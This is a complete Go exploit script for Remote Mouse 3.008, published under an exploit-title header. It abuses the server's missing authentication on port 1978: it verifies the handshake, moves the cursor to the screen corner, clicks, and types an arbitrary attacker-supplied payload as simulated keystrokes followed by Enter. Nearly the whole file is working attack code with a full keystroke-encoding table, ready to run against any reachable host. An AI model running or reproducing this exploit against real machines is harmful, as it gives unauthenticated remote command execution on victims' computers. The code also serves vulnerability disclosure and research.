// Exploit Title: Remote Mouse 3.008 - Failure to Authenticate
// Date: 2019-09-04
// Exploit Author: 0rphon
// Rewrite Date: 2021-06-18
// Exploit Rewrite: pngouin
// Software Link: https://www.remotemouse.net/
// Version: 3.008
// Tested on: Windows 10

package main

import (
	"flag"
	"log"
	"net"
	"strconv"
	"time"
)

func connectionTCP(ip string, port int) (*net.TCPConn, error) {
	servAddr := ip + ":" + strconv.Itoa(port)
	tcpAddr, err := net.ResolveTCPAddr("tcp", servAddr)
	if err != nil {
		log.Fatal(err.Error())
	}
	return net.DialTCP("tcp", nil, tcpAddr)
}

func connectionUDP(ip string, port int) (*net.UDPConn, error) {
	servAddr := ip + ":" + strconv.Itoa(port)
	udpAddr, err := net.ResolveUDPAddr("udp", servAddr)
	if err != nil {
		log.Fatal(err.Error())
	}
	return net.DialUDP("udp", nil, udpAddr)
}

func ping(conn net.TCPConn) bool {
	reply := make([]byte, 21)
	_, err := conn.Read(reply)
	if err != nil {
		log.Fatalln(err.Error())
	}

	conn.Close()
	if err != nil {
		log.Fatalln(err.Error())
	}

	echo := string(reply)
	return echo == "SIN 15win nop nop 300"
}

func send(str string, conn *net.UDPConn) {
	data := getCharacter(str)
	for _, ch := range data {
		if progression {
			print(string(ch))
		}
		write(ch, conn)
		time.Sleep(time.Duration(delay) * time.Millisecond)
	}
	if progression {
		print("\n")
	}
}

func writeXTimes(data []byte, times int, conn *net.UDPConn) {
	for i := 0; i < times; i++ {
		write(data, conn)
		time.Sleep(1 * time.Millisecond)
	}
}

func write(data []byte, conn *net.UDPConn) {
	_, err := conn.Write(data)
	if err != nil {
		log.Println("error: ", err.Error())
	}
}

func getCharacter(str string) [][]byte {
	data := make([][]byte, len(str))
	for i, ch := range str {
		bt := []byte(characters[string(ch)])
		data[i] = bt
	}
	return data
}

func mouseMove(x int, y int, conn *net.UDPConn) {
	if x > 0 {
		writeXTimes([]byte("mos  5m 1 0"), x, conn)
	} else {
		writeXTimes([]byte("mos  5m -1 0"), x*-1, conn)
	}

	if y > 0 {
		writeXTimes([]byte("mos  5m 0 1"), y, conn)
	} else {
		writeXTimes([]byte("mos  5m 0 -1"), y*-1, conn)
	}
}

func mousePress(command mouseClick, action mouseAction, conn *net.UDPConn) {
	switch action {
	case click:
		write([]byte(string(command)+string(down)), conn)
		write([]byte(string(command)+string(up)), conn)
	default:
		write([]byte(string(command)+string(action)), conn)
	}
}

func init() {
	flag.IntVar(&port, "port", 1978, "port of RemoteMouse server")
	flag.IntVar(&delay, "delay", 500, "delay between each write to the RemoteMouse server in millisecond")
	flag.StringVar(&host, "host", "", "host of the RemoteMouse server")
	flag.StringVar(&payload, "payload", "", "payload to the RemoteMouse server")
	flag.BoolVar(&progression, "progress", false, "show sended packet to the RemoteMouse server")
	flag.Parse()
}

func main() {
	connTCP, err := connectionTCP(host, port)
	if err != nil {
		log.Fatalln(err.Error())
	}
	if !ping(*connTCP) {
		log.Fatalln("Server doesn't respond with attended response")
	}
	time.Sleep(1 * time.Second)

	conn, err := connectionUDP(host, port)
	if err != nil {
		log.Fatalln(err.Error())
	}

	log.Println("[-] Mouse move")
	mouseMove(-6000, 4000, conn)
	time.Sleep(1 * time.Second)

	log.Println("[-] Mouse press")
	mousePress(leftClick, click, conn)
	time.Sleep(1 * time.Second)

	log.Println("[-] Send payload")
	send(payload, conn)
	time.Sleep(1 * time.Second)

	log.Println("[-] Send backline")
	send("\n", conn)

	log.Println("[-] Success ?")
}

var port int
var host string
var payload string
var progression bool
var delay int

type mouseClick string
type mouseAction string

const (
	leftClick   mouseClick  = "mos  5R l"
	rightClick  mouseClick  = "mos  5R r"
	middleClick mouseClick  = "mos  5R m"
	down        mouseAction = " d"
	up          mouseAction = " u"
	click       mouseAction = "click"
)

var characters = map[string]string{
	"A": "key  8[ras]116",
	"B": "key  8[ras]119",
	"C": "key  8[ras]118",
	"D": "key  8[ras]113",
	"E": "key  8[ras]112",
	"F": "key  8[ras]115",
	"G": "key  8[ras]114",
	"H": "key  8[ras]125",
	"I": "key  8[ras]124",
	"J": "key  8[ras]127",
	"K": "key  8[ras]126",
	"L": "key  8[ras]121",
	"M": "key  8[ras]120",
	"N": "key  8[ras]123",
	"O": "key  8[ras]122",
	"P": "key  8[ras]101",
	"Q": "key  8[ras]100",
	"R": "key  8[ras]103",
	"S": "key  8[ras]102",
	"T": "key  7[ras]97",
	"U": "key  7[ras]96",
	"V": "key  7[ras]99",
	"W": "key  7[ras]98",
	"X": "key  8[ras]109",
	"Y": "key  8[ras]108",
	"Z": "key  8[ras]111",

	"a": "key  7[ras]84",
	"b": "key  7[ras]87",
	"c": "key  7[ras]86",
	"d": "key  7[ras]81",
	"e": "key  7[ras]80",
	"f": "key  7[ras]83",
	"g": "key  7[ras]82",
	"h": "key  7[ras]93",
	"i": "key  7[ras]92",
	"j": "key  7[ras]95",
	"k": "key  7[ras]94",
	"l": "key  7[ras]89",
	"m": "key  7[ras]88",
	"n": "key  7[ras]91",
	"o": "key  7[ras]90",
	"p": "key  7[ras]69",
	"q": "key  7[ras]68",
	"r": "key  7[ras]71",
	"s": "key  7[ras]70",
	"t": "key  7[ras]65",
	"u": "key  7[ras]64",
	"v": "key  7[ras]67",
	"w": "key  7[ras]66",
	"x": "key  7[ras]77",
	"y": "key  7[ras]76",
	"z": "key  7[ras]79",

	"1": "key  6[ras]4",
	"2": "key  6[ras]7",
	"3": "key  6[ras]6",
	"4": "key  6[ras]1",
	"5": "key  6[ras]0",
	"6": "key  6[ras]3",
	"7": "key  6[ras]2",
	"8": "key  7[ras]13",
	"9": "key  7[ras]12",
	"0": "key  6[ras]5",

	"\n": "key  3RTN",
	"\b": "key  3BAS",
	" ":  "key  7[ras]21",

	"+":  "key  7[ras]30",
	"=":  "key  6[ras]8",
	"/":  "key  7[ras]26",
	"_":  "key  8[ras]106",
	"<":  "key  6[ras]9",
	">":  "key  7[ras]11",
	"[":  "key  8[ras]110",
	"]":  "key  8[ras]104",
	"!":  "key  7[ras]20",
	"@":  "key  8[ras]117",
	"#":  "key  7[ras]22",
	"$":  "key  7[ras]17",
	"%":  "key  7[ras]16",
	"^":  "key  8[ras]107",
	"&":  "key  7[ras]19",
	"*":  "key  7[ras]31",
	"(":  "key  7[ras]29",
	")":  "key  7[ras]28",
	"-":  "key  7[ras]24",
	"'":  "key  7[ras]18",
	"\"": "key  7[ras]23",
	":":  "key  7[ras]15",
	";":  "key  7[ras]14",
	"?":  "key  7[ras]10",
	"`":  "key  7[ras]85",
	"~":  "key  7[ras]75",
	"\\": "key  8[ras]105",
	"|":  "key  7[ras]73",
	"{":  "key  7[ras]78",
	"}":  "key  7[ras]72",
	",":  "key  7[ras]25",
	".":  "key  7[ras]27",
}
